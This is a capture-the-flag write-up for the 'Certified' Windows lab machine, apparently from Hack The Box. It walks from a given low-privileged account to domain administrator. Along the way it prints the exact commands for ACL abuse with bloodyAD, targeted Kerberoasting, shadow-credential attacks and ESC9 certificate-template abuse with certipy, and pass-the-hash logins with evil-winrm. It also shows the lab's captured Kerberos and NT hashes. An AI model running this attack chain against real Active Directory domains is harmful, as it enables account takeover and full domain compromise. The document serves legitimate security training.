

#### About

`Certified` is a medium-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. To gain access to the `management_svc` account, ACLs (Access Control Lists) over privileged objects are enumerated leading us to discover that `judith.mader` which has the `write owner` ACL over `management` group, management group has `GenericWrite` over the `management_svc` account where we can finally authenticate to the target using `WinRM` obtaining the user flag. Exploitation of the Active Directory Certificate Service (ADCS) is required to get access to the `Administrator` account by abusing shadow credentials and `ESC9`.


## Initial access
As is common in Windows pentests, you will start the Certified box with credentials for the following account: 
```
Username: judith.mader 
Password: judith09
```


## Nmap

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-30 18:15:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
|_ssl-date: 2026-08-30T18:16:39+00:00; +7h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
|_ssl-date: 2026-08-30T18:16:40+00:00; +7h00m02s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-30T18:16:39+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-06-11T21:05:29
| Not valid after:  2105-05-23T21:05:29
| MD5:     ac8a 4187 4d19 237f 7cfa de61 b5b2 941f
| SHA-1:   85f1 ada4 c000 4cd3 13de d1c2 f3c6 58f7 7134 d397
|_SHA-256: efbd f880 f25e 9059 7d06 867b ba6c 7050 277e 6fa7 aa81 5bee 9b4c bf63 358d e0b8
|_ssl-date: 2026-08-30T18:16:40+00:00; +7h00m02s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49724/tcp open  msrpc         Microsoft Windows RPC
49745/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-time: 
|   date: 2026-08-30T18:15:59
|_  start_date: N/A

```

## Shares

```
nxc smb 10.129.231.186 -u judith.mader -p SYSVOL --shares
```

![](pics/Pasted%20image%2020260830141734.png)

## bloodhound enum

```
bloodhound-python -d certified.htb -u judith.mader -p judith09 -c All --zip -ns 10.129.231.186
```

```
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
```


### Found something to abuse

![](pics/Pasted%20image%2020260830143126.png)

## From judith to management

```
bloodyAD -d certified.htb -u judith.mader -p judith09 -H 10.129.231.186 set owner management judith.mader
```

![](pics/Pasted%20image%2020260830143306.png)

Give judith `genericAll`:

```
bloodyAD  -d certified.htb -u judith.mader -p judith09 -H 10.129.231.186 add genericAll management judith.mader
```

![](pics/Pasted%20image%2020260830150150.png)

Then add her to the `Management` group:

```
bloodyAD  -d certified.htb -u judith.mader -p judith09 -H 10.129.231.186 add groupMember management judith.mader
[+] judith.mader added to management
```

Now judith is part of the group management

## From Management to management_svc

![](pics/Pasted%20image%2020260830143540.png)

```
targetedKerberoast.py -v  -d certified.htb -u judith.mader -p judith09
```
![](pics/Pasted%20image%2020260830144547.png)

```
management_svc:$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$8c0182ff90f7cb746c8aa4ef0e1cdcb7$2f9dfe000f857f9a8ed6deadeffe7a55532ae7cc0b5f68aedba7d63f874a28d41d03b1996e7331e6c66f25121e798f4539229e0734f1bae68329c7217b2714936f3451c2eb55e521d10940e20b57a7a00d8a81069d3f57de4afaa2eb2202ab99d3e2d71e6ee8850a3841424a91d2a6b8d64b379eb5aa384b63053954e9c0368826fd851445d52cef988405479d1603906de608eb8faee02ce16275bf244eaeb49b6e281e5719e7d306a438088ce2ca14102b343c3e59f08b57d303bf0063793695e94b3b8b84fa88e98957cd143806c1eaea3c0f7ffe5cf54c82851b62247f45a4eb1b284cab67649f7bfbadd4da5472bc9470c91016707ad8ba05bf69741c29484f53c4086614e59e7066c4350650940b70f0310d0ffa50ebf4550780d3da9113f4f3f1717da44bfa7e2e830ff5631bf7f72e26bbb11bd8988e9692d11fce9ab078a81f31c8f3ce89b04c4719c7ea27bd8a41c71f417f746436023c96eee4592e72e3b7b537901b00614a102b8c2ea0a08385eab4f60b581dde7608c16324ab6c2bea121c483b29df37b67bc15ed2d0f2d657e77e3198a28567e58b1b93e67f5f9fd97e15672f765aef8f47d20cf93b4f6f7ce2e7693c5e88b0ac5cade272246401011de652a6897862a9de565ac57466f041e67db6ccf87d12c229dfed3056ddf1a653f0e720ca2b976f03a3740e87e1d4eb6f3ec194b418cd8538c0fb290c731dd721888c7e806112dc236ff9fbc2ba24e3b3a56a8aa5a22ff4a609cb4465c77b2ecff3895e19c99e5293d3c96ebf1b3ba796066025bb3bd01618f563668006dd65249247eb8e37000dc8a10dc7db586fa065b193072e2d4d9772a1aa7f88dcd6cd508bb1798f3d4840c713b7ac0b63f28903bd9667a285e89d3ef4c50538aef594331cd0213f606d0e781e2dfcd79d84d980a10d40c8af73286669123c645c43ccaeb8ae10425ea9f27d16787f7c392948688e37fbcdb2542a3726e9f7de09404bf70c35e7660c42578188a8fd4dcc68c191c0ea49bbedafee844ff14484366bab438a7e206595f0c8bf9c3951ae71454461b239ccfe3ddf0a578f441d0d2591f7a53cfdbebec2ee2f75fa683bc98393aa40b0a0ef69d9fdf0db5de22d196fe9adc33f0515bfe69db92cec017447c3b46294082d665adb18173795db1d8b7800153b646e96a7f24139728fd7ad54a0421646d8d2c30da1f16501afca5ac9343debf9b27d968e33de85fde9d5937463b6ffa26aefad4158beea3dd32ac311e88fbd11daa966d983d1453bb4e141caedc8ed5594b0688a724268277fd36872788284dbba4d833687addc265d25a49df7edd8f88af40a7fbc42d4ea76841d15d4662ab73e6c42d18c42ed6b8c13ab108dcfa22ba148072ab8c2744ad4446d15bf77ddc9a337c27e6fe4c6d27c01e0eac2e81e1312a6647984047a646a2e187012cb5df6154b22cfa7d621a58dfe5f57eda9d624c7b8e25459550039c7ccd39b348bf19a01eed78098b005b68c7d15b1c6d7977e2dc6783a3ef9e75a7ec21b9a0deb0a296206b6ae6cc254467a1cb1a46bf80a53130ab05db218
```

Used this at first but I could not crack it so I used another approach
```
certipy shadow auto -u judith.mader -p judith09 -account management_svc -dc-ip 10.129.231.186
```

![](pics/Pasted%20image%2020260830150432.png)

I got a NT hash to pass that can allow me to login unlike the krb5 hash.
```
management_svc:a091c1832bcdd4677c28b5a6a1295584
```

Verify hash
![](pics/Pasted%20image%2020260830150605.png)

## flag 1

Using evil-winRM
```
evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

![](pics/Pasted%20image%2020260830150720.png)


## PrivEsc

```
certipy find -u management_svc -hashes ":a091c1832bcdd4677c28b5a6a1295584" -dc-ip 10.129.231.186 -vulnerable
```

![](pics/Pasted%20image%2020260830151534.png)
Nothing Here

### From management_svc to CA_OPERATOR

Interesting we have `GenericAll`:
![](pics/Pasted%20image%2020260830151558.png)

Perform shadow attack
```
certipy shadow auto -u management_svc -hashes ":a091c1832bcdd4677c28b5a6a1295584" -account CA_OPERATOR -dc-ip 10.129.231.186
```
Got the NT hash
```
NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

Now do the templates enum command again with new creds
```
certipy find -u ca_operator -hashes ":b4b86f45c6018f1b664f70805f45d8f2" -dc-ip 10.129.231.186 -vulnerable
```

A template called `CertifiedAuthentication` is vuln to `ESC9`
![](pics/Pasted%20image%2020260830152430.png)

## Exploit ESC9

Since a have `genericAll` on `ca_operator`
```
certipy account \
    -u management_svc -hashes ":a091c1832bcdd4677c28b5a6a1295584" \
    -dc-ip '10.129.231.186' -upn 'administrator' \
    -user 'ca_operator' update 
```

![](pics/Pasted%20image%2020260830154209.png)

**case 1**: Since I already had creds for the `ca_operator`. In case, you did not have it
```
certipy shadow \
    -u 'management_svc@certified.htb' -hashes ':a091c1832bcdd4677c28b5a6a1295584' \
    -dc-ip '10.129.231.186' -account 'ca_operator' \
    auto
```



if you went with `case 1` approach
```
export KRB5CCNAME=ca_operator.ccache 
```
Then do this 
```
certipy req \
    -k -dc-ip '10.129.231.186' \
    -target 'certified.htb' -ca 'certified-DC01-CA' \
    -template 'CertifiedAuthentication'
```
This failed for me 

**case 2**: using the creds like my case
```
certipy req \
    -dc-ip '10.129.231.186' \
    -target 'certified.htb' -ca 'certified-DC01-CA' -u ca_operator  -hashes ':b4b86f45c6018f1b664f70805f45d8f2' \
    -template 'CertifiedAuthentication' -dc-host dc01.certified.htb
```
This worked
![](pics/Pasted%20image%2020260830162955.png)


Now Lets dump the `administrator` NT  hash since `ca_operator` UPN is now the `administrator` UPN:

```
certipy auth \ 
    -dc-ip '10.129.231.186' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'certified.htb'
```

![](pics/Pasted%20image%2020260830163308.png)

```
administrator:0d5b49608bbce1751f708748f67e2d34
```
## Flag 2

Using evil-winRM again.

```
evil-winrm -i 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
```

![](pics/Pasted%20image%2020260830163447.png)

And Got the Flag!

![](pics/Pasted%20image%2020260830163539.png)
